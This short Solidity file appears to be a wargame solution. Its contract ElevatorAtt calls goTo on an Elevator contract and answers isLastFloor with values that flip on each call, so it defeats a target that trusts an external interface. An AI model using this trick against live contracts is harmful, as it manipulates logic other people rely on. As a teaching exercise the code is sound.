// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract ElevatorAtt {
    bool inCall;

    function attack(address target, uint256 floor) public {
        Elevator(target).goTo(floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        inCall = !inCall;
        return !inCall;
    }
}
